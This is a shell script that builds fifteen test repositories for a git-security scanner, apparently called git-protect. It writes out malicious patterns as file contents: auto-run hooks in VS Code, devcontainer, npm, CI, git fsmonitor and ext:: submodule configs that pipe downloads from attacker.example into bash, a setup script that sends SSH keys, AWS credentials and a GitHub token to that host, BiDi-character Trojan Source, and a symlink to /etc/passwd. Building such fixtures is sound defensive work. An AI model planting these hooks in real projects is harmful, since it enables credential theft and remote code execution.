#!/bin/bash
set -euo pipefail

# Creates test repos with various attack vectors for manual git-protect testing.
# These repos contain INTENTIONALLY MALICIOUS patterns – that's the point.
# git-protect should detect and block all of them.
#
# Usage: ./test-repos/setup-attack-repos.sh

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BASE_DIR="$SCRIPT_DIR/repos"

rm -rf "$BASE_DIR"
mkdir -p "$BASE_DIR"

init_repo() {
    local name="$1"
    local dir="$BASE_DIR/$name"
    mkdir -p "$dir"
    git -C "$dir" init -q
    git -C "$dir" config user.email "test@test.com"
    git -C "$dir" config user.name "Test"
    echo "$dir"
}

commit_repo() {
    local dir="$1"
    local msg="${2:-init}"
    git -C "$dir" add -A
    git -C "$dir" commit -q -m "$msg"
}

echo "=== Creating attack test repos ==="
echo ""

# 1. VS Code tasks.json with folderOpen (Contagious Interview attack)
echo "[1] vscode-folderopen – VS Code auto-run on folder open"
DIR=$(init_repo "01-vscode-folderopen")
mkdir -p "$DIR/.vscode"
cat > "$DIR/.vscode/tasks.json" << 'TASK'
{
    "version": "2.0.0",
    "tasks": [{
        "label": "Project Setup",
        "type": "shell",
        "command": "curl -s http://attacker.example/payload.sh | bash",
        "runOptions": {"runOn": "folderOpen"},
        "presentation": {"reveal": "silent"}
    }]
}
TASK
echo "# Interview Task" > "$DIR/README.md"
commit_repo "$DIR"

# 2. .envrc with GIT_CONFIG_* bypass
echo "[2] envrc-gitconfig – .envrc overrides git config protections"
DIR=$(init_repo "02-envrc-gitconfig")
cat > "$DIR/.envrc" << 'ENVRC'
export GIT_CONFIG_COUNT=2
export GIT_CONFIG_KEY_0=core.fsmonitor
export GIT_CONFIG_VALUE_0="curl -s http://attacker.example/c2.sh | bash"
export GIT_CONFIG_KEY_1=core.hooksPath
export GIT_CONFIG_VALUE_1=".malicious-hooks"
ENVRC
echo "# Dev Project" > "$DIR/README.md"
commit_repo "$DIR"

# 3. Embedded bare repo with fsmonitor
echo "[3] embedded-bare-repo – hidden .git/ with core.fsmonitor"
DIR=$(init_repo "03-embedded-bare-repo")
mkdir -p "$DIR/vendor/analytics/.git"
cat > "$DIR/vendor/analytics/.git/config" << 'CFG'
[core]
    repositoryformatversion = 0
    fsmonitor = "curl -s http://attacker.example/exfil.sh | bash"
CFG
echo "ref: refs/heads/main" > "$DIR/vendor/analytics/.git/HEAD"
echo "# Analytics" > "$DIR/vendor/analytics/README.md"
echo "# Main" > "$DIR/README.md"
commit_repo "$DIR"

# 4. Malicious .gitattributes with custom filter
echo "[4] gitattributes-filter – custom smudge filter"
DIR=$(init_repo "04-gitattributes-filter")
echo '*.c filter=compile' > "$DIR/.gitattributes"
echo 'int main() { return 0; }' > "$DIR/main.c"
echo "# C Project" > "$DIR/README.md"
commit_repo "$DIR"

# 5. Submodule with ext:: protocol
echo "[5] submodule-ext – ext:: protocol command execution"
DIR=$(init_repo "05-submodule-ext")
cat > "$DIR/.gitmodules" << 'MODS'
[submodule "lib"]
    path = lib
    url = ext::sh -c curl% http://attacker.example/payload% |% bash
MODS
echo "# Project" > "$DIR/README.md"
commit_repo "$DIR"

# 6. Submodule with path traversal
echo "[6] submodule-traversal – path escapes repo boundary"
DIR=$(init_repo "06-submodule-traversal")
cat > "$DIR/.gitmodules" << 'MODS'
[submodule "escape"]
    path = ../../.git/hooks
    url = https://github.com/legit-org/hooks.git
MODS
echo "# Project" > "$DIR/README.md"
commit_repo "$DIR"

# 7. Credential stealing script
echo "[7] credential-stealer – exfiltrates SSH keys and AWS creds"
DIR=$(init_repo "07-credential-stealer")
cat > "$DIR/setup.sh" << 'SETUP'
#!/bin/bash
echo "Setting up dev environment..."
cat ~/.ssh/id_rsa | curl -s -X POST -d @- http://attacker.example/collect
cat ~/.aws/credentials | curl -s -X POST -d @- http://attacker.example/collect
echo "$GITHUB_TOKEN" | curl -s -X POST -d @- http://attacker.example/collect
echo "Setup complete!"
SETUP
chmod +x "$DIR/setup.sh"
echo "# Quick Start – run setup.sh" > "$DIR/README.md"
commit_repo "$DIR"

# 8. package.json with dangerous lifecycle hooks
echo "[8] npm-postinstall – postinstall runs on npm install"
DIR=$(init_repo "08-npm-postinstall")
cat > "$DIR/package.json" << 'PKG'
{
    "name": "interview-task",
    "version": "1.0.0",
    "scripts": {
        "postinstall": "node scripts/setup.js",
        "start": "node index.js"
    }
}
PKG
mkdir -p "$DIR/scripts"
cat > "$DIR/scripts/setup.js" << 'JS'
const { execFile } = require('child_process');
execFile('curl', ['-s', 'http://attacker.example/implant.sh'], (err, stdout) => {
    execFile('bash', ['-c', stdout]);
});
JS
echo "# Frontend Challenge – run npm install" > "$DIR/README.md"
commit_repo "$DIR"

# 9. Trojan Source (BiDi control characters)
echo "[9] trojan-source – BiDi chars hide malicious logic"
DIR=$(init_repo "09-trojan-source")
# Embed U+202A (LRE) and U+202C (PDF) in Go source
printf 'package main\n\nimport "fmt"\n\nfunc main() {\n\tvar isAdmin = false\n\t// Check access \xe2\x80\xaa\n\tif isAdmin {\xe2\x80\xac {\n\t\tfmt.Println("Access granted")\n\t}\n}\n' > "$DIR/main.go"
echo "# Go Project" > "$DIR/README.md"
commit_repo "$DIR"

# 10. Devcontainer with lifecycle hooks
echo "[10] devcontainer – lifecycle hooks run in container"
DIR=$(init_repo "10-devcontainer")
mkdir -p "$DIR/.devcontainer"
cat > "$DIR/.devcontainer/devcontainer.json" << 'DC'
{
    "name": "Dev Environment",
    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
    "postCreateCommand": "curl -s http://attacker.example/setup.sh | bash"
}
DC
echo "# Open in Codespaces" > "$DIR/README.md"
commit_repo "$DIR"

# 11. VS Code settings override interpreters
echo "[11] vscode-settings – overrides Python/git binary path"
DIR=$(init_repo "11-vscode-settings")
mkdir -p "$DIR/.vscode"
cat > "$DIR/.vscode/settings.json" << 'SETTINGS'
{
    "python.defaultInterpreterPath": "/tmp/malicious-python",
    "git.path": "/tmp/malicious-git",
    "terminal.integrated.shell.linux": "/tmp/malicious-shell"
}
SETTINGS
echo "# Python Project" > "$DIR/README.md"
commit_repo "$DIR"

# 12. GitHub Actions with suspicious commands
echo "[12] ci-pipeline – GitHub Actions with curl|sh"
DIR=$(init_repo "12-ci-pipeline")
mkdir -p "$DIR/.github/workflows"
cat > "$DIR/.github/workflows/ci.yml" << 'CI'
name: CI
on: [push]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: curl -s http://attacker.example/ci.sh | sh
CI
echo "# Project" > "$DIR/README.md"
commit_repo "$DIR"

# 13. Makefile with $(shell)
echo "[13] makefile-shell – $(shell) executes during make parse"
DIR=$(init_repo "13-makefile-shell")
printf 'TOKEN := $(shell cat ~/.ssh/id_rsa 2>/dev/null | base64 -w0)\nall: main.c\n\tgcc -o main main.c\n' > "$DIR/Makefile"
echo 'int main() { return 0; }' > "$DIR/main.c"
commit_repo "$DIR"

# 14. Symlink escaping repo
echo "[14] symlink-escape – symlink points to /etc/passwd"
DIR=$(init_repo "14-symlink-escape")
ln -s /etc/passwd "$DIR/passwords.txt"
echo "# Project" > "$DIR/README.md"
commit_repo "$DIR"

# 15. Clean repo (control – should pass)
echo "[15] clean-repo – legitimate project, no threats"
DIR=$(init_repo "15-clean-repo")
cat > "$DIR/main.go" << 'GO'
package main

import "fmt"

func main() {
    fmt.Println("Hello, World!")
}
GO
echo "module example.com/hello" > "$DIR/go.mod"
echo "# Hello World" > "$DIR/README.md"
commit_repo "$DIR"

TOTAL=$(ls -d "$BASE_DIR"/*/ 2>/dev/null | wc -l)
echo ""
echo "=== $TOTAL attack repos created in $BASE_DIR ==="
echo "Run: ./test-repos/run-tests.sh"
